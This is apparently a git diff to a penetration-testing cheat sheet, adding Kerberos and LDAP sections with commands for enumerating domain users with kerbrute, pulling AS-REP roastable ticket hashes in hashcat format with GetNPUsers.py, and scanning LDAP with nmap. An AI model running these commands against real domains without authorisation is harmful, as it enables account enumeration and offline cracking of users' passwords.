@@ -5,7 +5,9 @@
 
 - [DMP File](#dmp-file)
 - [Exfiltration](#exfiltration)
+- [Kerberos](#kerberos)
 - [MSRPC](#msrpc)
+- [Ldap](#ldap)
 - [Samba](#samba)
 - [Virus](#virus)
 - [WinRM](#winrm)
@@ -59,6 +61,32 @@ evil-winrm -i ip -u user -p password
 ### Extract
 ```bash
 Foremost file.dmp
+```
+
+## Kerberos
+*Port: 88*
+
+Kerberos is an authentication protocol that is used to verify the identity of a user or host.
+
+### Bruteforce User
+```bash
+kerbrute userenum -d domain --dc ip user.txt
+```
+
+### Get user ticket
+Checking if Kerberos pre-authentication has been disabled for accounts
+```
+GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip domain
+```
+
+- [Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+
+## Ldap
+*Port: 389, 636*
+
+### Nmap
+```
+nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 ```
 
 ## Exfiltration
